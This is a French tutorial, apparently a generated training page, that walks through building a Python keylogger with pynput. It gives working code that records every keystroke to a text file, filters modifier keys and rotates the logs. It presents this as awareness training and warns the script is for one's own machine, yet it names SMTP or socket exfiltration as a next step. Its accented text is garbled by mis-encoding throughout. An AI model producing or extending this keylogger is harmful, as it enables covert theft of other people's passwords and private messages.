# Tutoriel : CrÃ©er un keylogger basique pour s'entraÃ®ner

## ğŸ¯ Objectif  
Concevoir un keylogger Python simple sauvegardant les frappes dans un fichier texte. Parfait pour comprendre leur fonctionnement et apprendre comment s'en protÃ©ger.

## ğŸ§  ScÃ©nario dâ€™ancrage Ã©motionnel  
Imaginez un consultant sÃ©curitÃ© interceptant son propre clavier pour prouver Ã  un client la dangerositÃ© dâ€™un keylogger malveillant.

---

## ğŸ› ï¸ PrÃ©requis  
- Linux (Debian/Ubuntu)  
- Pythonâ€¯3  
- Installer `pynput` (ou `keyboard`) via :  
  ```bash
  pip install pynput


â¸»

Ã‰tapeâ€¯1 â€“ Capturer les frappes avec pynput

from pynput import keyboard

def on_press(key):
    try:
        k = key.char
    except AttributeError:
        k = f"[{key.name.upper()}]"
    print(k, end='', flush=True)
    with open("keylogs.txt", "a", encoding="utf-8") as f:
        f.write(k)

listener = keyboard.Listener(on_press=on_press)
listener.start()
listener.join()

	â€¢	key.char pour lettres, sinon key.name (ex. [ENTER])
	â€¢	Ouverture en append pour ne pas effacer les logs

â¸»

ğŸ§© Ã‰tapeâ€¯2 â€“ Filtrer les touches importantes

AmÃ©lioration : ignorer certaines touches comme les contrÃ´les :

ignore = {keyboard.Key.shift, keyboard.Key.ctrl, keyboard.Key.alt}
def on_press(key):
    if key in ignore:
        return
    # log comme avant


â¸»

ğŸ”„ Ã‰tapeâ€¯3 â€“ Rotation simple des logs (Ã©viter fichiers trop gros)

import os

if os.path.exists("keylogs.txt") and os.path.getsize("keylogs.txt") > 1024*100:
    os.rename("keylogs.txt", "keylogs.old.txt")

ExÃ©cutÃ© avant chaque Ã©criture.

â¸»

ğŸ§  Analogies & piÃ¨ges
	â€¢	CamÃ©ra cachÃ©e : vous captez tout, mais cela peut Ãªtre illÃ©gal sans consentement.
	â€¢	âš ï¸ Attention : utiliser uniquement sur votre propre machine.
	â€¢	Filtrage important : ne pas logger des touches non utiles.

â¸»

ğŸ§ª Quiz
	1.	Pourquoi utiliser listener.join() ?
	2.	Que se passe-t-il si on oublie encoding="utf-8" ?
	3.	Pourquoi ignorer ctrl, shiftâ€¦ ?
	4.	Quels risques si le fichier log grossit trop ?
	5.	Comment Ã©viter la perte de donnÃ©es si le script sâ€™interrompt ?

â¸»

âœ… Cas dâ€™usage
	â€¢	Workshop de sensibilisation
	â€¢	Audit personnel de sÃ©curitÃ©
	â€¢	Base pour ajouter exfiltration (SMTP, socketâ€¦)

â¸»

ğŸ”§ Prolongements possibles
	â€¢	Rotations avancÃ©es ou compression des logs
	â€¢	Envoi pÃ©riodique par e-mail ou socket
	â€¢	Interface simple pour lecture en temps rÃ©el

â¸»

ğŸ“ RÃ©sultat attendu

Un script Python minimaliste sauvegardant les frappes, avec filtrage, rotation des fichiers et structure claire.

---

### ğŸ“š Sources  
- Implementation de base avec `pynput`   
- Exemples Windows/Linux via GeeksforGeeks   
- Techniques dâ€™exfiltration SMTP/sockets 